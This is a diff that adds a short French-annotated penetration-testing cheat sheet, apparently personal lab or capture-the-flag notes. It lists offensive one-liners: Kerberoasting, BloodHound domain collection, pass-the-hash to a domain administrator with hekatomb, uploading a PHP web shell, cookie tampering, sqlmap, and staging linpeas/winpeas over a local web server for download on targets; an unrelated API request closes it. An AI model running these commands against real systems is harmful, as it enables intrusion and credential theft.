@@ -1,0 +1,26 @@
+xfreerdp /u:$USER /d:$DOMAINE /v:$IP /p:'$PASSWORD' /kbd:0x0000040C #xfreerdp avec langue FR
+nmap -sU --min-rate 5000 -p- $TARGET #Nmap UDP rapide
+linfast # Téléchargement de winpeas + création serveur web + copie commande iwr avec Ip dans le presse papier
+winfast # Téléchargement de linpeas + création serveur web + copie commande wget avec Ip dans le presse papier
+bloodhound.py -d '$DC' -u '$USER' -p '$PASSWORD' -c all -ns $IP #collecteur pour BH directement depuis l'host
+mssqlclient.py <user>@<FQDN/IP> -windows-auth #connexion mssql
+GetUserSPNs.py -request -dc-ip 192.168.50.70 corp.com/USER #Kerberoasting 
+rustscan -a $TARGET -- -A -sC | tee scan_$TARGET
+curl -d emergency=1 $TARGET/script
+curl -H "Cookie: SessionToken=1" $TARGET
+curl -F 'file1=@f1.pdf' -F 'file2=@f2.pdf' -F 'submit=Upload' $TARGET/form
+http $TARGET/admin/ Cookie:SessionToken=1
+http -f POST $TARGET/panel/ fileUpload@cmd.php5 submit=true
+sqlmap -r burp-req.txt
+stegseek --seed IMG.jpg -
+nuclei -tags osint -var user=
+nuclei -tags osint-social -var user=
+nuclei -t /opt/cipher387-juicyinfo-nuclei-templates/juicy_info/email.yaml -l urls.txt
+MetaDetective -d $FOLDER
+MetaDetective --scraping --scan --url $URL
+hekatomb -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug
+
+echo '{"key":"[API_KEY]","cursor":0,"mode":"API"}' | \
+  http POST https://api.byword.ai/list_articles \
+  accept:application/json \
+  content-type:application/json
